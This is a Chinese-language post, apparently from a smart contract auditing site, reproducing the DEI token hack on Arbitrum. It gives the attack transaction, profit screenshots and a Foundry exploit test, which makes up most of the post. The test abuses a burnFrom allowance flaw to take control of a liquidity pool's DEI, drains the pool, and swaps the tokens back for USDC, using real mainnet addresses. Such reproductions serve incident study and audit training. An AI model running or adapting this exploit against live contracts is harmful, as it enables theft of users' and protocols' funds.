>**了解智能合约审计和最佳实践请**[点击查看文档](https://safful.com/) 

# 智能合约漏洞案例，DEI 漏洞复现

# 1. 漏洞简介

[https://twitter.com/eugenioclrc/status/1654576296507088906](https://twitter.com/eugenioclrc/status/1654576296507088906)
![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694318123903-5dbdfcf3-0773-4b41-8efc-2cc93434b234.png#averageHue=%23f0f0f0&clientId=uac557b7f-3297-4&from=paste&id=u367cc357&originHeight=475&originWidth=530&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uac81e4f9-8613-41d1-a663-ba84c74381e&title=)

# 2. 相关地址或交易

[https://explorer.phalcon.xyz/tx/arbitrum/0xb1141785b7b94eb37c39c37f0272744c6e79ca1517529fec3f4af59d4c3c37ef](https://explorer.phalcon.xyz/tx/arbitrum/0xb1141785b7b94eb37c39c37f0272744c6e79ca1517529fec3f4af59d4c3c37ef) 攻击交易

# 3. 获利分析

![](https://cdn.nlark.com/yuque/0/2023/png/97322/1694318123938-898725c9-25b8-4bd4-a097-3722aa9a4ade.png#averageHue=%23ffc166&clientId=uac557b7f-3297-4&from=paste&id=uf04b6d6b&originHeight=269&originWidth=1751&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ub50c42a4-aa4b-405d-8eea-215681e0440&title=)

# 5. 漏洞复现

```
pragma solidity ^0.8.10;

//import  "../interfaces/interface.sol";
import "forge-std/Test.sol";
import "./interface.sol";
import "../contracts/ERC20.sol";

interface DEI {
    function burnFrom(address account, uint256 amount) external;
}

interface AMM {
    function sync() external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getAmountOut(uint amountIn, address tokenIn) external returns(uint256);

}

contract ContractTest is Test{

    address constant dei = 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0;
    address constant victim = 0x7DC406b9B904a52D10E19E848521BbA2dE74888b;
    address constant usdc = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;



    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("arbitrum", 87626026 -2);
        //uint256 forkId = cheats.createFork("bsc");
        //cheats.selectFork(forkId);

    }

    function testExploit() external {
        IERC20(dei).approve(victim,type(uint256).max);
        DEI(dei).burnFrom(victim, 0);
        emit log_named_decimal_uint("Attacker DEI allowance", IERC20(dei).allowance(victim,address(this)), 18);

        uint256 victimNum = IERC20(dei).balanceOf(victim);
        emit log_named_decimal_uint("victim DEI allowance", victimNum, 18);
        IERC20(dei).transferFrom(victim,address(this),victimNum-1);
        AMM(victim).sync();
        emit log_named_decimal_uint("After attack,Attacker DEI allowance",IERC20(dei).balanceOf(address(this)), 18);
        uint outNum = AMM(victim).getAmountOut(victimNum-1, dei);
        emit log_named_decimal_uint("outNUm is :",outNum, 18);

        IERC20(dei).transfer(victim,victimNum-1);
        AMM(victim).swap(0, outNum, address(this), "");

        emit log_named_decimal_uint("After attacker's usdc is :",IERC20(usdc).balanceOf(address(this)), 6);

    }
}
```
